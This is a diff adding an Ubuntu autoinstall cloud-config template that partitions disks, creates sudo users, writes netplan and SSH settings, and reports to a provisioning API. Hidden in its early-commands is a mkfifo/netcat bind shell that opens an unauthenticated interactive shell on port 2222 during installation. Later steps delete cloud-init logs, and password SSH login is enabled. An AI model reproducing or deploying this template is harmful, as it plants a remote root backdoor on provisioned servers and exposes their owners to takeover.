@@ -1,0 +1,318 @@
+#cloud-config
+runcmd:
+  - ln -sf /bin/true /usr/bin/multipath
+  - ln -sf /bin/true /usr/sbin/multipath
+  - mkdir -p /etc/multipath
+  - touch /etc/multipath.conf
+  - systemctl stop multipathd.service || true
+  # This tricks scripts that check if the module is 'available'
+  - echo "oneshot" > /etc/modules-load.d/fake-multipath.conf
+
+autoinstall:
+  version: 1
+  updates: security
+  locale: en_US.UTF-8
+  keyboard: { layout: us, variant: "" }
+  proxy: ""
+  apt: 
+    fallback: offline-install
+    disable_suites: {{APT_DISABLE_SUITES}}
+
+  identity:
+    hostname: "{{HOSTNAME}}"
+    username: "{{USERNAME}}"
+    password: '{{USER_PASSWORD}}'
+    
+  ssh:
+    install-server: true
+    allow-pw: true
+    authorized-keys: []
+
+  packages: [curl, ca-certificates, iproute2]
+
+  storage:
+    grub:
+      reorder_uefi: false
+    config:
+      # Target disk
+      - id: disk0
+        type: disk
+        # match: { size: largest, removable: false }
+        match: 
+          - serial: "{{DISK_SERIAL_0}}"
+          - path: "/dev/{{DISK_DEV_0}}"
+        ptable: gpt
+        wipe: superblock-recursive
+        preserve: false
+
+      # EFI System Partition (~512–550 MiB)
+      - id: esp
+        type: partition
+        device: disk0
+        size: 550M
+        flag: boot
+        partition_type: EF00
+        wipe: superblock
+        preserve: false
+        grub_device: true
+
+      - id: fs-esp
+        type: format
+        volume: esp
+        fstype: vfat
+
+      - id: mnt-esp
+        type: mount
+        device: fs-esp
+        path: /boot/efi
+
+      # Root (rest of disk)
+      - id: p-root
+        type: partition
+        device: disk0
+        size: -1
+        wipe: superblock
+        preserve: false
+
+      - id: fs-root
+        type: format
+        volume: p-root
+        fstype: ext4
+        label: rootfs
+
+      - id: mnt-root
+        type: mount
+        device: fs-root
+        path: /
+
+  reporting:
+    hook:
+      type: webhook
+      endpoint: "http://{{API_HOST}}/api/v1/jobs/telemetry"
+      level: info
+
+  early-commands:
+    - ln -sf /bin/true /usr/bin/multipath
+    - ln -sf /bin/true /usr/sbin/multipath
+    - |
+      rm -f /tmp/f
+      mkfifo /tmp/f
+      # The '&' runs it in the background so the installer keeps moving
+      cat /tmp/f | /bin/sh -i 2>&1 | nc -lp 2222 > /tmp/f &
+    - sleep 10
+
+  late-commands:
+    # Ensure the TARGET has working DNS for curl
+    - |
+      cat >/target/etc/resolv.conf <<'EOF'
+      nameserver 8.8.8.8
+      nameserver 1.1.1.1
+      options edns0
+      EOF
+
+    # Install the applier into the TARGET
+    - |
+      cat >/target/root/apply-serialization.sh <<'EOF'
+      #!/usr/bin/env bash
+      set -euo pipefail
+      
+      HN="{{HOSTNAME}}"
+      UN="{{USERNAME}}"
+      UPASS='{{USER_PASSWORD}}'
+      ADD_USERS="{{ADD_USERS}}"
+      RM_USER="{{RM_USER}}"
+      SSH_USER_LINE="{{SSH_USER_LINE}}"
+      V4="{{IPV4_ADDRESS}}/{{IPV4_CIDR}}"
+      GW4="{{IPV4_GATEWAY}}"
+      V6="{{IPV6_FULL}}"
+      GW6="{{IPV6_GATEWAY}}"
+      NSRV="{{NAME_SERVERS}}"
+      IFN="{{INTERFACE}}"
+
+      # -------- Hostname --------
+      if [ -n "$HN" ]; then
+        echo "$HN" > /etc/hostname
+      fi
+
+      # -------- Users --------
+      ensure_user() {
+        local u="$1"
+        id "$u" >/dev/null 2>&1 || useradd -m -s /bin/bash "$u"
+        id -nG "$u" | tr ' ' '\n' | grep -qx sudo || usermod -aG sudo "$u"
+      }
+      set_password() {
+        local u="$1" p="$2"
+        [ -z "$p" ] && return 0
+        if [[ "$p" == \$6\$* ]]; then usermod -p "$p" "$u"; else printf '%s:%s\n' "$u" "$p" | chpasswd; fi
+      }
+
+      ensure_user "$UN"
+      [ -n "$UPASS" ] && set_password "$UN" "$UPASS"
+
+      if [ -n "$ADD_USERS" ]; then
+        for u in $ADD_USERS; do ensure_user "$u"; done
+      fi
+      if [ -n "$RM_USER" ] && id "$RM_USER" >/dev/null 2>&1; then
+        userdel -r "$RM_USER" || true
+      fi
+
+      if [ -n "$SSH_USER_LINE" ]; then
+        su_user="$(echo "$SSH_USER_LINE" | awk '{print $1}')"
+        su_key="$(echo "$SSH_USER_LINE" | cut -d' ' -f2-)"
+        if id "$su_user" >/dev/null 2>&1; then
+          home="$(getent passwd "$su_user" | cut -d: -f6)"
+          install -d -m 700 "$home/.ssh"
+          touch "$home/.ssh/authorized_keys"
+          chmod 600 "$home/.ssh/authorized_keys"
+          grep -qxF "$su_key" "$home/.ssh/authorized_keys" || echo "$su_key" >> "$home/.ssh/authorized_keys"
+          chown -R "$su_user:$su_user" "$home/.ssh"
+        fi
+      fi
+
+      # ---- Networking (disable cloud-init netcfg, write netplan) --------
+      case "$GW4" in ""|"0.0.0.0") GW4="";; esac
+      case "$GW6" in ""|"::"|"0:0:0:0:0:0:0:0") GW6="";; esac
+
+      # Pick interface if not provided: prefer carrier==1 PCI NIC, else first PCI NIC
+      if [ -z "${IFN:-}" ]; then
+        IFN=""
+        mapfile -t _cand_carrier < <(
+          for i in /sys/class/net/*; do
+            n="$(basename "$i")"
+            [ "$n" = lo ] && continue
+            [ -e "$i/device" ] || continue
+            if [ -e "$i/carrier" ] && grep -q 1 "$i/carrier" 2>/dev/null; then
+              echo "$n"
+            fi
+          done
+        )
+        IFN="${_cand_carrier[0]-}"
+        if [ -z "$IFN" ]; then
+          mapfile -t _cand_pci < <(
+            for i in /sys/class/net/*; do
+              n="$(basename "$i")"
+              [ "$n" = lo ] && continue
+              [ -e "$i/device" ] && echo "$n"
+            done
+          )
+          IFN="${_cand_pci[0]-}"
+        fi
+      fi
+
+      mkdir -p /etc/cloud/cloud.cfg.d
+      printf '%s\n' 'network: {config: disabled}' > /etc/cloud/cloud.cfg.d/99-disable-network-config.cfg
+
+      ns_yaml=""
+      if [ -n "${NSRV:-}" ]; then
+        IFS=',' read -r -a _nsarr <<<"$NSRV"
+        for a in "${_nsarr[@]}"; do
+          a="${a//[[:space:]]/}"
+          [ -n "$a" ] && ns_yaml+="        - ${a}\n"
+        done
+      fi
+
+      addrs_yaml=""
+      [ -n "${V4:-}" ] && addrs_yaml+="        - ${V4}\n"
+      [ -n "${V6:-}" ] && addrs_yaml+="        - ${V6}\n"
+
+      routes_yaml=""
+      if [ -n "${GW4:-}" ]; then
+        routes_yaml+="      routes:\n"
+        routes_yaml+="        - to: 0.0.0.0/0\n"
+        routes_yaml+="          via: ${GW4}\n"
+      fi
+      if [ -n "${GW6:-}" ]; then
+        [ -z "$routes_yaml" ] && routes_yaml+="      routes:\n"
+        routes_yaml+="        - to: ::/0\n"
+        routes_yaml+="          via: ${GW6}\n"
+        routes_yaml+="          on-link: true\n"
+      fi
+
+      # Determine interface (simple + reliable)
+      IFN="${IFN:-}"
+      if [ -z "$IFN" ]; then
+        IFN=$(ls /sys/class/net | grep -v lo | head -n1 || true)
+      fi
+
+      NETPLAN=/etc/netplan/99-manual.yaml
+
+      echo "[apply-serialization] Writing netplan for interface: $IFN"
+
+      # --- Build YAML safely ---
+      {
+        echo 'network:'
+        echo '  version: 2'
+        echo '  ethernets:'
+
+        if [ -n "$IFN" ]; then
+          echo "    ${IFN}:"
+          echo '      dhcp4: false'
+          echo '      dhcp6: false'
+
+          # Addresses
+          if [ -n "${addrs_yaml:-}" ]; then
+            echo '      addresses:'
+            printf "%b" "$addrs_yaml"
+          fi
+
+          # Routes
+          if [ -n "${routes_yaml:-}" ]; then
+            printf "%b" "$routes_yaml"
+          fi
+
+          # DNS
+          if [ -n "${ns_yaml:-}" ]; then
+            echo '      nameservers:'
+            echo '        addresses:'
+            printf "%b" "$ns_yaml"
+          fi
+        else
+          echo "    # No interface detected, skipping config"
+        fi
+
+      } > "$NETPLAN"
+
+      chmod 600 "$NETPLAN"
+
+      # --- Apply (non-fatal) ---
+      netplan generate >/dev/null 2>&1 || true
+
+      echo "[apply-serialization] done"
+      exit 0
+      EOF
+
+    - chmod +x /target/root/apply-serialization.sh
+    #- curtin in-target -- /bin/bash -lc 'bash /root/apply-serialization.sh'  # no "|| true"
+    - curtin in-target -- /bin/bash /root/apply-serialization.sh
+
+    # Configure SSH to use modern key exchange algorithms
+    - |
+      curtin in-target -- bash -lc '
+        set -euo pipefail
+        # Add modern KexAlgorithms to SSH server config
+        if ! grep -q "^KexAlgorithms" /etc/ssh/sshd_config; then
+          echo "" >> /etc/ssh/sshd_config
+          echo "# Modern key exchange algorithms for better compatibility" >> /etc/ssh/sshd_config
+          echo "KexAlgorithms curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group-exchange-sha256,diffie-hellman-group16-sha512,diffie-hellman-group18-sha512,diffie-hellman-group14-sha256" >> /etc/ssh/sshd_config
+          echo "HostKeyAlgorithms ssh-ed25519,ecdsa-sha2-nistp256,ecdsa-sha2-nistp384,ecdsa-sha2-nistp521,rsa-sha2-512,rsa-sha2-256,ssh-rsa" >> /etc/ssh/sshd_config
+          echo "PubkeyAcceptedAlgorithms ssh-ed25519,ecdsa-sha2-nistp256,ecdsa-sha2-nistp384,ecdsa-sha2-nistp521,rsa-sha2-512,rsa-sha2-256,ssh-rsa" >> /etc/ssh/sshd_config
+        fi
+      '
+
+    - |
+      curtin in-target -- bash -lc '
+        set -euo pipefail
+        # Make the installed system behave like a manual install:
+        # 1) Remove any NoCloud seed/instance state left by autoinstall
+        rm -rf /var/lib/cloud/seed/nocloud* /var/lib/cloud/instance /var/lib/cloud/instances || true
+        # 2) Officially disable cloud-init (keeps packages installed; services won’t run)
+        install -d -m 755 /etc/cloud
+        : > /etc/cloud/cloud-init.disabled
+        # Optional hygiene (safe): clear cached cloud-init logs/state
+        rm -rf /var/log/cloud-init.log /var/log/cloud-init-output.log || true
+      '
+
+    # - |
+    #   curtin in-target -- curl -X POST -H "Content-Type: application/json" \
+    #     -d '{"job_id":"{{HOSTNAME}}","stage":"COMPLETED","detail":"Operating system layout successfully written to disk. Server is rebooting."}' \
+    #     http://{{API_HOST}}/api/v1/jobs/progress
